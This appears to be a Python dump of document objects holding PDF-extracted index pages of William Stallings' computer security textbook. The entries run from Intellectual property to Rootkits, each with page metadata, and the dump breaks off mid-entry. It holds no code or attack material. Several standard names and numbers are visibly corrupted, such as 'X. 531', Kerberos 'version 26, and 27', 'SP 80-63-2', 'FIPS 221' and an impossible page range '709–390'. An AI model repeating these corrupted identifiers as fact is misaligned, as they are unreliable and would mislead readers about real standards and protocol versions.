34–35, 123\\nsystem and information, 39\\nIntegrity check value, 702\\nIntel digital random number generator (DRNG), 79\\nIntellectual property, 605\\ncopyrights, 605\\ninfringement, 605–606\\npatents, 605, 607\\nrelevant to network and computer security, 607–608\\ntrademark, 607\\ntypes of, 605–607\\nU.S. Digital Millennium Copyright Act (DMCA), 608–609\\nInterception, 32, 241, 589, 603\\nInterface, 315\\nInternational Convention on Cybercrime, 602\\nInternational Organization for Standardization (ISO), 49,  \\n176, 481–482, 515, 576, 578–579\\nInternational Telecommunication Union (ITU), 49,  \\n572, 714\\nInternet authentication\\nKerberos, 707–713\\npublic-key infrastructure (PKI), 716–718\\nX. 531, 713–716\\nInternet banking server (IBS), 45\\nInternet Engineering Task Force (IETF), 718\\nPublic Key Infrastructure X.509 (PKIX), 718\\nInternet mail architecture, 687–688\\nInternet Message Access Protocol (IMAP), 293\\nInternet of Things (IoT)\\nand cloud context, 467–470\\ncomponents of, 466–467\\nevolution, 466\\ngateway security functions, 473\\nopen-source security module, 476–478\\noverview of, 466\\npatching vulnerability, 471\\nprivacy requirements, 471–473\\nsecurity, 470\\nsecurity elements of, 470–471\\nsecurity framework, 474–476\\nInternet of Things (IoT) enabled device\\nactuator, 467\\nmicrocontroller, 467\\nradio-frequency Identification (RFID), 467\\nsensor, 466–467\\ntransceiver, 467\\nInternet protocol protection, 475\\nInternet Relay Chat (IRC), 258, 293\\nnetworks, 229–230\\nInternet security protocols. See also IP security (IPsec)\\nDKIM, 686–690\\nHTTPS, 697–698\\nIPv4 security, 698–703\\nIPv6 security, 698–703\\nsecure E-mail, 683–686\\nS/MIME, 683–686\\nSSL, 690–697\\nTLS, 690–697\\nInternet society, 49\\nInternet use policies, 560–561\\nInterposable libraries, 587–590\\nInterposable library function, 588–590\\nIntruders, 274–278\\nbehavior, 276–278\\nclasses of, 274–275\\ncyber criminals, 274–275\\ndefinition, 274\\nhacktivists, 275\\ninitial access, 277\\nintrusion detection, 278–281\\nmaintaining access, 277\\nprivilege escalation, 277\\nrange of attacks, 276\\nskill levels, 275–276\\ntarget acquisition and information gathering, 276–277\\nIntrusion, 32\\nIntrusion detection and prevention system (IDPS), 328\\nIntrusion Detection Exchange Protocol (IDXP), 298\\nIntrusion Detection Message Exchange Format (IDMEF), 298\\nIntrusion detection systems (IDS), 564\\nexchange format, 297–299\\nIntrusion Detection Exchange Protocol (IDXP), 298\\nIntrusion Detection Message Exchange Format  \\n(IDMEF), 298\\nIntrusion management, 463\\nIntrusion prevention systems (IPS), 276, 328–332, 564\\ndistributed or hybrid, 330–332\\nhost-based, 328–330\\nnetwork-based, 330\\nSnort Inline, 331–332\\nunified threat management (UTM), example of, 332–336\\nInverse add round key transformation (AES), 640\\nInverse shift row transformation (AES), 640\\nInverse substitute byte transformation (AES), 638\\nINVITE request, 259\\nIP address spoofing, 317\\nipfw program, 432\\nIPhone Trojans, 226\\nIP protocol field, 315\\nIPS. See Intrusion prevention systems (IPS)\\nIPSec platform, 326\\nIP security (IPsec), 75, 412, 714\\napplications of, 699\\nbenefits, 699–700\\nESP, 701–702\\nprotocol mode, 701\\nrouting applications, 700\\nSA, 700–701\\nscope, 700\\niptables program, 432\\nZ16_STAL0611_04_GE_IDX.indd   789 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 791, 'page_label': '790'}, page_content='790  INDEX\\nIPv4, 293, 698–703\\nIPv6, 265, 698–703\\nIR 7 ,320, Glossary of Key Information Security Terms, 128\\nIris biometric authentication system, 111, 119–121\\nIris-recognition camera, 120\\nISO. See International Organization for Standardization (ISO)\\nISO 27 ,024, 578–579\\nISO/IEC 27 ,024 Security Controls, 515\\nIsolation, 42\\nIssuer name, 714\\nIT security management, definition, 482\\nITU Telecommunication Standardization Sector (ITU-T), 714\\nJ\\nJourneyman, 275\\nK\\nKerberos environment, 711\\nInternet authentication and, 707–713\\nperformance issues, 713\\nticket-granting service (TGS), 708\\nticket-granting ticket (TGT), 709–390\\nversion 26, and 27, 712–713\\nKerberos protocol, 707–711\\nKerberos server, 711\\nKernel, 139, 234, 241, 350, 357 , 369, 420–421, 424, 432, 436, 591\\nKernel mode, DAC, 139\\nKernel mode rootkits, 235\\nKey distribution center (KDC), 651\\nKey distribution, symmetric encryption, 650–651\\nKeyed hash MAC, 64\\nKey expansion, AES, 641\\nKeyloggers, 207 , 231\\nKeylogging, 229\\nKey management, 72–77 , 80, 191\\nKey pair recovery, 718\\nKeys\\nprivate, 678\\npublic, 67, 71, 676, 678, 716\\nKeystream, 58, 641\\nKlez mass-mailing worm, 227\\nKnown session ID, 46\\nL\\nLaboratory exercises, 755\\nLAN monitor agent, 288\\nLaptop data encryption, 80\\nLavaRnd, 79\\nLaw enforcement agencies, 602\\nLayering, 42\\nLeaky system resources, 30\\nLeast astonishment, 43\\nLeast common mechanism, 41\\nLeast privileges, 41, 404–406, 559\\nLegal aspects of computer security, 26, 47 , 128, 250, 270, 300, \\n484–486, 488, 490, 492, 503, 505, 518\\ncybercrime and, 601–605\\nethical issues, 618–623\\nintellectual property and, 605–611\\nLevel of risk, 31, 301, 487–488, 493, 496, 499–500, 504, 507 , \\n518–519, 526\\nLiability, 552\\nLibraries, 234, 329, 354\\nanti-XSS, 394\\ndynamic, 375\\ndynamically linked shared, 588\\ndynamically loadable, 401, 403\\ndynamically loaded, 320\\nDynamic Link Libraries (DLLs), 285\\nexecutable, 432\\ninterposable, 587–590\\nsafe, 367\\nshared, 588\\nstandard, 363, 367, 370, 403\\nstatically linked, 588\\nstatically linked shared, 588\\nTCP wrappers, 431\\nthird-party application, 367\\nLibrary-based tape encryption, 80\\nLibrary function, 347 , 372, 373, 406–409, 587–590\\nLibsafe, 367\\nLifecycle management, 156\\nLightning, 533\\nLightweight Directory Access Protocol (LDAP), 464\\nLikelihood, 47 , 67 , 99, 210, 222, 225, 232, 331, 384, 395, 399, 407 , \\n488–489, 491, 496–500, 502, 504–507 , 518, 522, 525\\nLimited role hierarchy, 146–147\\nLink encryption, 650\\nLinux/Unix security\\naccess controls, 431–432\\napplication and service configuration, 430\\napplication security using a chroot jail, 432–433\\nlogging and log rotation, 432\\npatch management, 429–430\\ntesting, 433\\ntroubleshooting a chrooted application, 432–433\\nusers, groups, and permissions, 430–431\\nLiterary works, copyrighted, 606\\nLoadable modules, 591\\nLocal area network (LAN), 32, 123, 290, 293, 325\\nLocation services, mobile device security, 728\\nLock, 409\\nLockfile, software security, 409–411\\nLog, 94, 99, 115–116, 180, 216, 278, 284, 299, 300, 303, 319, \\n321, 325, 332, 404, 425, 428, 432, 522, 571, 579, 581–587 , \\n592–597 , 708, 709\\nLog analysis, 584\\ntools, 564\\nLog file encryption, 585\\nlogger, 584\\nLogging function, 428, 432, 581–584\\nat the application level, 587\\ninterposable libraries, 587–590\\nsyslog (UNIX), 584–587\\nat the system level, 581–587\\nWindows Event Log, 581–584\\nLogic bomb, 207 , 211, 228\\nLogic bomber, 211\\nLogon events, 583\\nLow interaction honeypot, 300\\nLulzSec, 275\\nM\\nMachine readable zone (MRZ), 107\\nMac OS X secure file delete program, 408\\nMAC protocol data unit (MPDU), 732\\nMacro virus, 207 , 212, 215\\nMAC service data unit (MSDU), 732, 733\\nMail delivery agent (MDA), 687\\nMail submission agent (MSA), 687\\nMain distribution area, 198\\nMaintenance hook, 233\\nMaintenance of information systems, 38\\nMaintenance of security controls, 522\\nMalicious association, 724\\nZ16_STAL0611_04_GE_IDX.indd   790 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 792, 'page_label': '791'}, page_content='INDEX  791\\nMalicious insiders, 458\\nMalicious software (malware), 287\\nattack kits, 208–209\\nattack sources, 209\\nbackdoor (trapdoor), 32–33, 207, 220, 233, 277, 336\\nbots, 229–230, 242, 325, 623\\ncountermeasures for, 236–242\\ndefinition, 206\\nlogic bomb, 207, 211, 228\\nmobile code, 207, 220, 222\\nrootkits, 207, 234–235, 241\\nspreading of new, 229\\nterminologies for, 207\\nTrojan horse, 33, 118–119, 207, 252–226, 329\\ntypes, 207–209\\nmalloc() function, 369, 373\\nMalvertising, 209\\nMalware. See Malicious software (malware)\\nManagement, 299, 496–498, 501–502, 505–506\\naccess, 157\\naccount, 583\\nchange, 523–524\\nconfiguration, 34, 38, 40, 524\\ncontent, 610\\ncontrols, 37, 47, 512, 515–517\\ncredential, 156–157\\nof data, 369, 373, 375\\ndatabase, 131, 132, 171–173, 180, 182\\nDigital Rights Management (DRM), 609–611\\nidentity, 156, 610\\nIT security, 511, 520–521\\nkey, 72–77, 79–80, 191\\nmemory, 369, 373, 375, 399\\nnetwork, 290\\npatch, 429–430, 433\\nrights, 610\\nrisk, 487–488, 493, 503, 507\\nsecurity information and event management (SIEM), 297\\nManagement-level training, 556\\nManagement traffic, 441\\nManager, 299\\nMandatory access control (MAC), 131, 183, 425\\nMan-in-the-middle attacks, 678, 724\\nManning, Chelsea, 275\\nManual defensive coding practices, 182\\nMarkov modeling techniques, 98\\nMarkov models, 285\\nMarkov process model, 98, 285\\nMasquerade, security threats by, 32–33, 36\\nMaster, 275–276\\nMaster session key (MSK), 744\\nMD5, 66, 96, 666, 716\\nMD5 crypt, 96\\nMeasured service cloud systems, 447\\nMedium access control (MAC), 595, 732–733\\nassociation-related services, 735–736\\ncontrol, 732\\ndestination MAC address, 733\\nheader, 733\\nspoofing, 724\\ntrailer, 733\\nMelissa e-mail worm, 219\\nMemory allocator, 375\\nMemory cards, 104–105\\nMemory leak, 399–400\\nMemory management unit (MMU), 369\\nMessage authentication code (MAC), 691\\nMessage confidentiality, symmetric encryption and, 628–651\\nMessage/data authentication, 59–64\\nauthenticated encryption (AE), 666–669\\ncode (MAC), 60–62\\nas a complex function of message and key, 60\\nDiffie–Hellman key exchange/key agreement, 71, 76, 674–679\\nhash functions and, 59–67\\nHMAC, 64, 663–666\\nRSA algorithm, 669–672\\nusing a message authentication code (MAC), 60–62\\nusing a one-way hash function, 62–64\\nusing public-key encryption, 63\\nusing secret key, 64\\nusing symmetric encryption, 59\\nwithout confidentiality, 60\\nwithout message encryption, 60–64\\nMessage digest, 62, 65, 659, 660\\nMessage integrity, 691, 737 , 749\\nMessage store (MS), 687\\nMessage transfer agent (MTA), 687\\nMessage user agent (MUA), 687\\nMetamorphic virus, 215\\nMetamorphic worms, 222\\nMicrocontroller, 467\\nMiller, Barton, 395\\nMinimal effect on functionality, 576\\nMiniSec operating system, 476\\nMisappropriation, 32–33\\nMisuse, 32–33, 170–171, 281, 538, 603, 614, 618, 715\\nMix column transformation, AES, 640\\nMixter, 257\\nMobile code, 207 , 220\\nMobile device security, 726–730\\nCloud-based applications, 726–727\\nde-perimeterization, 727\\nexternal business requirements, 727\\ninteraction with other systems, 728\\nlocation services, 728\\nnew devices, growing use of, 726\\nphysical security controls, 727\\nsecurity threats, 727\\nstrategy, 728–730\\ntraffic security, 730\\nuntrusted applications, 728\\nuntrusted content, 728\\nuntrusted mobile devices, 727–728\\nuntrusted networks, 728\\nMobile phone Trojans, 226–227\\nMobile phone worms, 222–223\\nMobility, 723\\nModes of operation, 57\\nsymmetric encryption, 644–650\\nModification of messages, 36\\nModification right, 606\\nModularity, 42\\nMonitoring risks, 522–524\\nMorris, Robert, 218\\nMorris worm, 218–219, 348, 354\\nMotion pictures, copyrighted, 606\\nMotivation, 495, 551–552, 560\\nMPDU exchange\\nassociation, 742\\nnetwork and security capability discovery, 741\\nopen system authentication, 741\\nMultics, 233\\nMulti-instance model in data protection, 459\\nMultipartite virus, 215\\nMultiple encodings, 393\\nMultiple password use, 93\\nMultipurpose internet mail extension (MIME), 683\\nMulti-tenant model in data protection, 460\\nMultivariate model, 282\\nMusical works, copyrighted, 606\\nZ16_STAL0611_04_GE_IDX.indd   791 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 793, 'page_label': '792'}, page_content='792  INDEX\\nMutation engine, 215\\nMutual authentication and authorization, 472\\nMutually exclusive roles, RBAC, 147–148\\nMydoom, 220\\nN\\nNational ID cards, 106\\nNational Institute of Standards and Technology (NIST), 41, \\n48–49, 55, 66, 71, 142, 538, 633, 659, 678\\nbuffer overflow, 343\\ncloud computing reference architecture, 451–454\\nprogram of standardizing encryption and hash algorithms, 41\\nFIPS PUB 140-3, 142\\nSP 80-63-2, 90\\nSP 522–314, 451\\nSP 800-144, 454–456\\nSP 800-145, 446\\nSP 800-146, 457\\nSP 800-53, 514, 516\\nFIPS 221, 25\\nNational Security Agency (NSA), 39, 628\\nNative virtualization, 437 , 438\\nNatural disasters, as threats to physical security, 531–533\\nNessus, 433\\nnetfilter kernel module, 432\\nNetwork attack surface, 43\\nNetwork-based IDS (NIDS), 279, 289–295\\napplication layer reconnaissance and attacks, 293\\ndeployment of network sensors, 291–293\\nlogging of alerts, 294–295\\nnetwork layer reconnaissance and attacks, 293\\nnetwork sensors, 290\\npolicy violations, 293\\nsignature detection, 293\\ntransport layer reconnaissance and attacks, 293\\nunexpected application services, 293\\nNetwork-based IPS (NIPS), 330\\nNetwork enforced policy, 476\\nNetwork File System (NFS), 293\\nNetwork injection, 725\\nNetwork interface card (NIC), 196, 290, 438\\nNetwork layer address spoofing, 317\\nNetwork security, 464\\nattacks, 36–37\\nNetwork sensors, 290\\nNeuer Personalausweis, 106\\nNeural networks, 285\\nNever Before Seen (NBS) Anomaly Detection Driver, 595\\nNext header, 702\\nNIST. See National Institute of Standards and Technology\\nNo-execute bit, 369\\nNo-execute protection, 369\\nNoise, 537\\nNonexecutable memory, 369\\nNonrepudiation, 25–26, 28, 516, 577\\nNontraditional networks, 724\\nNOP sled, 360–361, 369, 373\\nNotification, 299\\nNULL terminator, 345\\nO\\nObject access, 583\\nObject attributes, 149\\nObjects of access control, 132\\nObstruction, 32–33, 41\\nOff-by-one attacks, 371\\nOffline dictionary attack, 92–93\\nOffset Codebook (OCB), 477 , 666–669\\nOn-demand self-service, 447–448\\nOne-way hash function, 62–64, 92, 96, 657\\nof password, 92\\nOne-way/preimage resistant, 65\\nOnline Certificate Status Protocol (OCSP), 716\\nOnline polls/games, 230\\nOpenBSD system, 96, 97 , 370\\nOpen design, 41\\nOpen Identity Exchange (OIX) Corporation, 160\\nOpen identity trust framework (OITF), 158–161\\nOpenID Foundation, 160\\nOpenID identity providers, 160\\nOpen recursive DNS servers, 265\\nOpenStack security module\\nidentity, 464\\npolicies, 465\\nservice catalog, 464\\ntoken, 464\\nvirtual machine, 465\\nOpen systems interconnection (OSI), 317\\nOpen Web Application Security Project, 177 , 380–381\\nOperating modes, 477–478\\nOperating system (OS)\\ninteracting with other programs, 412\\nleast privileges, 404–406\\nprivilege escalation, 404–406\\nrace conditions, prevention of, 409–410\\nstandard library functions, 406–409\\nsystems calls and, 406–409\\ntemporary files, safe use of, 410–412\\nOperating system-based security mechanisms, 173\\nOperating system security\\nadditional security controls, installation of, 425–426\\ncategories of users, groups, and authentication, 425\\nhardening and configuring the operating system, 422–426\\ninitial setup and patching, 423–424\\nLinux/Unix, 429–433\\nplanning, 422\\nremoving unnecessary services, application, and  \\nprotocols, 424\\nresource controls, configuration of, 425\\nsecurity layers, 420\\nsecurity testing, 433\\ntesting of, 426\\nWindows, 433–435\\nOperational control, 47 , 512–513\\nOperational technology (OT), 466\\nOperation Aurora, 2,031, 232\\nOperator, 299\\nOrganizational security policy, 484–487\\nOR-node, 44–45\\nOS. See Operating system (OS)\\nOSI. See Open systems interconnection (OSI)\\nOut-of-band attack, 182\\nOutside attack, 31\\nOverflows\\nbuffer, 342–345, 348, 354, 364–365, 367, 370, 375\\nglobal data area, 375\\nheap, 372–375\\noff-by-one attacks, 371\\nreplacement stack frame, 370–371\\nOverlay networks, 439\\nOvervoltage condition, 537\\nOwner, 68, 74, 80, 105, 132, 136, 140–142, 150–151, 183, 186, 191, \\n401–404, 411–412, 430, 605–606, 608, 710, 713\\n‘Owner’ access right, 138\\nOwnership and authorship, 617\\nOwnership-based administration, 183\\nZ16_STAL0611_04_GE_IDX.indd   792 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 794, 'page_label': '793'}, page_content='INDEX  793\\nP\\nPacket filtering firewall, 315–317\\npack() function, 353\\nPadding, 702\\nPad length, 702\\nPairwise master key (PMK), 744\\nPairwise transient key (PTK), 745\\nPantomimes, copyrighted, 606\\nParameterized query insertion, 182\\nParasitic software, 210\\nParasitic virus, 227\\nPartitioning, 193\\nPassive attack, 31, 36–37\\nPassive sensor, 290, 303\\nPassword Authenticated Connection Establishment (PACE), 109\\nPassword-based authentication, 92–104\\nidentifier (ID), 92\\npassword cracking of user-chosen passwords, 97–99\\nuse of hashed passwords, 94–96\\nvulnerability of, 92–94\\nPassword cracker, 96\\nPasswords, 66\\ncracking of user-chosen passwords, 97–99\\nfile access control, 99–100\\nguessing against single user, 93\\nlength, 96\\nprotocol, 115–116\\nPassword selection strategies, 100–104\\nBloom filter, 102–104\\ncomplex password policy, 101\\ncomputer-generated passwords, 101\\npassword checker, 102\\nreactive password checking, 101\\nrule enforcement, 101–102\\nuser education strategy, 100\\nusing proactive password checker, 101\\nPatching, 312, 423–424\\nPatch management\\nLinux/Unix security, 429–430\\nWindows security, 433\\nPatents, intellectual property and, 605, 607\\nPath MTU, 701\\nPATH variable, 402–403\\nPattern matching, 330\\nPayload, 211, 229–236\\nPayload actions, 208\\nPayload data, 702\\nPC Cyborg Trojan, 227\\nPC data encryption, 80\\nPeer-to-peer “gossip” protocol, 295\\nPerimeter scanning approaches, 241–242\\nPeriodic review of audit trail data, 593–594\\nPeriod of validity, 714\\nPermanent key, 650\\nPermission, computer security and, 146, 148\\nPermissions, 40–41, 86, 139–140, 142, 145–146, 148, 153–154, \\n186–187 , 212, 397 , 401, 412, 423, 425, 430–431, 434\\nPersistent, 209\\nPersonal firewalls, 322–323\\nPersonal identification number (PIN), 46, 88, 104, 108, 111, 157\\nPersonal identity verification (PIV), 542–545\\ncard issuance and management subsystem, 544\\nfront end subsystem, 543\\nPersonal privacy, 608\\nPersonal property, 605\\nPersonal technology, 466\\nPersonnel, role in physical security, 531\\nPersonnel security, 39\\nduring employment, 559\\nPhishing, 206, 210, 224–226, 231–232, 276, 336, 604\\nPhysical access audit trail, 580\\nPhysical facility, 531\\nPhysical isolation, 42\\nPhysical security\\nbreaches, recovery from, 541\\nenvironmental threats, 533–540\\nhuman-caused physical threats, 537–538, 540–541\\ninfrastructure security, 530\\nlogical security, 530\\nlogical security, integration of and, 542–548\\nnatural disasters as threats to, 531–533\\npersonal identity verification (PIV), 542–545\\npremises security, 530\\nprevention and mitigation measures, 538–541\\ntechnical threats, 537, 540\\nthreats, 531–538\\nPhysical user input, 180\\nPictorial, graphic, and sculptural works, copyrighted, 606\\nPiggybacked queries, 181\\nPing of death, DoS, 249\\nPIV authentication key (PKI), 545–546\\nPlaintext, 54–55, 67 , 628, 635\\npublic-key encryption, 67\\nsymmetric encryption, 54\\nPlan-Do-Check-Act Process Model, 484\\nPlanning, 38\\nPlant patents, 607\\nPlatform as a service (PaaS), 448\\nPoison packet, DoS, 249\\nPolicy changes, 583\\nPolicy enforcement points (PEPs), 297\\nPolicy management, 157\\nPolicy scope, 560\\nPolymorphic virus, 215, 238\\nPopular password attack, 93\\nPosition independent, 357–358\\nx86 assembly code, 358\\nPost Office Protocol (POP), 293\\nPractical security assessments, 758\\nPreimage resistant, 65\\nPreimage resistant hash functions, 65–66\\nPreprocessing, 649\\nPrerequisite, 148\\nPreset session ID, 46\\nPre-shared key (PSK), 744\\nPretty Good Privacy (PGP) package, 80\\nPreventative controls, 513\\nPrevent/Prevention, 31, 36–37 , 39, 42, 47–48, 77 , 93, 123, 128, 177 , \\n182, 189, 231, 260, 265, 268, 279, 287 , 316, 319, 329, 335,  \\n342, 364, 370–371, 375, 380, 389–391, 402–403, 408–409, \\n414, 417 , 421, 423, 426, 434, 494, 513, 515, 574, 604, 607 , \\n608, 612, 614\\nPrimary key, 174\\nprintf() library routine, 354\\nPrivacy, 25, 561\\ncomputer usage, 614–615\\nand confidentiality, 617\\ndata surveillance and, 615–617\\nEuropean Union Data Protection Directive, 612\\nlaws and regulations, 612\\nwith message integrity, 737\\norganizational response, 613–614\\npersonal, 612\\nUnited States Privacy Act, 613\\nPrivate cloud, 450\\nPrivate key, 67–70, 73–74, 427 , 672, 678\\nPrivilege escalation, 404\\nPrivilege-escalation exploits, 329\\nZ16_STAL0611_04_GE_IDX.indd   793 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 795, 'page_label': '794'}, page_content='794  INDEX\\nPrivilege management, 157\\nPrivilege use, 583\\nProactive password checker, 101\\nProcess tracking, 584\\nProfile-based anomaly detection, 282\\nProgram code, writing\\nallocation and management of dynamic memory  \\nstorage, 399–400\\ncorrect algorithm implementation, 396–398\\ncorrespondence between algorithm and machine  \\nlanguage, 398\\ninterpretation of data values, 398–399\\npreventing race conditions with shared memory, 400\\nProgram input, 384–395\\nbuffer overflow, 385\\ncanonicalization, 394\\nescaping meta characters, 393\\nfuzzing, 394–395\\ninterpretation of, 385–392\\nmultiple encodings, 393\\nsize of, 385\\nvalidating syntax, 392–394\\nProgrammers, 556\\nProgramming project, 758\\nProgram output, handling of, 413–415\\nProgram, writing a, 382–383\\nPropagation phase of virus, 211\\nProtection\\ndomains, 138–139\\nmedia, 38\\nphysical and environment, 38\\nsystem and communications, 39\\nProtocol anomaly, 330\\nProtocol identifier, 701\\nProvable security, 650\\nProxy. See Gateways\\nProxy certificates, 715\\nPseudonymity, 614\\nPseudorandom function (PRF), 749–751\\nPseudorandom numbers, 77–79\\nPsychological acceptability, 41\\nPublic access systems, 518\\nPublic cloud, 449–450\\nPublic-display right, 606\\nPublic-key certificates, 74–75, 686\\nPublic-key encryption/cryptosystem, 67–72, 106, 227\\napplications, 70, 71\\nasymmetric encryption algorithms, 71–72\\nauthenticated encryption (AE), 666–669\\nauthentication and/or data integrity, 68\\nconfidentiality, 68\\nDiffie–Hellman key exchange/key agreement, 674–679\\nDigital Signature Standard (DSS), 678–679\\nelliptic curve cryptography (ECC), 679\\ngeneral-purpose, 68\\nHMAC, 663–666\\ningredients, 67–68\\nmessage or data authentication using, 62, 63\\nmode of operation of, 68\\npublic-key key distribution, 67\\nrequirements, 70–71\\nRSA, 669–674\\nsecure hash functions, 657–662\\nstructure, 67–69\\nsymmetric key exchange using, 75–76\\nPublic-key information, 714\\nPublic-key infrastructure (PKI), 716–718\\nPublic Key Infrastructure X.509 (PKIX), 718\\nPublic keys, 67–68, 71–72, 676, 678, 716\\nPublic-performance right, 606\\nQ\\nQuality of Service (QoS) attributes, 149\\nQueries, 32, 178, 181, 182, 191, 289, 397 , 595, 716\\nAS, 708\\ndatabase, 249\\nDNS, 259, 262\\nillegal/logically incorrect, 181\\ninference and, 188, 189\\npiggybacked, 181\\nQuery languages, 172, 176–177\\nQuery processor, 194\\nR\\nRace conditions, prevention of, 400\\nRadio-frequency Identification (RFID), 467\\nRadix-64, 686\\nRainbow table, 97\\nRandom access, 649–650\\nRandom access memory (RAM), 106\\nRandom delay, 674\\nRandom (selective) drop of an entry, 268\\nRandom number, 94, 101, 107 , 115\\nRandom numbers, security algorithms based on, 77–79\\nindependence of, 77\\npseudorandom numbers vs., 78–79\\nrandomness of, 77–78\\nuniform distribution, 77\\nunpredictability of, 77\\nRansomware, 227\\nRapid elasticity, 447\\nRate limiting, 585\\nRaw socket interface, DoS, 251\\nRBAC. See Role-based access control\\nRC4 algorithm, 642–644\\nReactive password checking, 101\\nRead access, 132\\nReading/report assignments, 759\\nRead-only memory (ROM), 106\\nRealms, Kerberos, 77 , 711–712\\nReal property, 605\\nReal-time audit analysis, 594\\nReasonable personal use, 561\\nReceived code, 61\\nReconnaissance, 232–233\\nRecord protocol, TLS, 691–692\\nRecover, 31\\nRecovery, 48\\nRecursive function call, 348\\nReference monitors, 516\\nReflection attacks, 261–264\\nReflector attacks, 256, 261–264\\nRegistration, 718\\nRegistration authority (RA), 87 , 718\\nRegistry access, 285\\nRegular expression, 393\\nRegulations obligations, 552\\nReject, 331–332\\nRelation, 174–175, 404, 420, 495, 518\\nRelational databases, 173–177\\nabstract model of, 175\\nbasic terminologies of, 174\\ncreation of multiple tables, 173\\nelements of, 174–176\\nexample, 174–175\\nrelational query language, 173\\nstructure, 173\\nstructured query language (SQL), 176–177\\nRelease of message contents, 36\\nReliance on key employees, 559\\nZ16_STAL0611_04_GE_IDX.indd   794 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 796, 'page_label': '795'}, page_content='INDEX  795\\nRelying parties (RPs), 88, 160–161\\nRemote code injection attack, 405\\nRemote Procedure Call (RPC), 293\\nRemote user authentication\\ndynamic biometric protocol, 117\\npassword protocol, 115–116\\nstatic biometric protocol, 117\\ntoken protocol, 116–117\\nReplacement stack frame, 370–371\\nReplay, 36, 77 , 115, 118–119, 124, 513, 678, 710–711\\nReplay attacks, 119, 678\\nReplay protection, 476\\nRepository, 718\\nReproduction right, 606\\nRepudiation, 32–33, 513\\nRequests for Comments (RFCs)\\nIntrusion Detection Exchange Format, 298\\nRFC 1,869, 684\\nRFC 2,656, 683\\nRFC 2,850, 278\\nRFC 3,392, 684\\nRFC 4,156, 683\\nRFC 5,674, 684\\nRFC 5,772, 683\\nRFC 5,773, 683\\nRFC 5,774, 684\\nRFC 4,893, 686\\nRFC 4,971, 29, 128\\nRFC 2,849, 266\\nRequirements, 281\\nResearch projects, 757\\nResidual risk, 519\\nResource management, 157\\nResource pooling, 448\\nResources, 149, 495, 723\\nResponse, 48, 299\\nRetinal biometric system, 110\\nReturn address defender (RAD), 368\\nReturn to system call, 371–372\\nReverse engineering, 608\\nREVOKE command, 184–185\\nRights holders, 610\\nRijndael, 57\\nRisk, 30, 31, 494\\nacceptance, 501–502\\nanalysis, 384\\nappetite, 493\\navoidance, 502\\nconsequences, 498–499\\nhigh level, 91\\nindex, 491\\nlikelihood, 497\\nlow level, 90\\nmoderate level, 91\\nregister, 499–500\\ntransfer, 502\\ntreatment, 501–502\\nRisk assessment, 39\\ndigital user authentication, 89–92\\nof systems, 518\\nRivest, Ron, 71, 669\\nRlogin, 293\\nRobust filtering, 584\\nRobust security network (RSN), 737\\nRockYou file, 99\\nRole, 145\\nRole-based access control (RBAC), 131, 142–148, 464\\naccess control matrix, 144\\nfor a bank, 162–164\\nbase model, 146\\ncardinality, 148\\nconstraints, 147–148\\nof database, 186–188\\nkey elements, 143\\nmany-to-many relationships between users and roles, 146\\nmatrix representation of, 143\\nmutually exclusive roles, 148\\nnon-overlapping permissions, 148\\nprerequisites, 148\\nreference models, 145–146\\nrelationship of users to roles, 142\\nrole hierarchies, 146–147\\nRole-based security, 474–475\\nRole constraints, 147\\nRole hierarchies, 146–147\\nRoles\\nfixed database, 187\\nfixed server, 187\\nhierarchies, 147\\nRBAC, 142–148, 186–188\\nrelative to IT systems, 552\\nuser-defined, 187–188\\nRoot, 44–45, 151, 207 , 222, 234, 241, 276, 329, 361–363, 373, 402, \\n405, 411, 431–432, 579, 586, 676, 716\\nRootkits, 207 , 233–236\\nBlue Pill, 236\\ncharacteristics of, 234\\ncountermeasures, 241\\ndefinition, 234\\nexternal mode, 234\\nkernel mode, 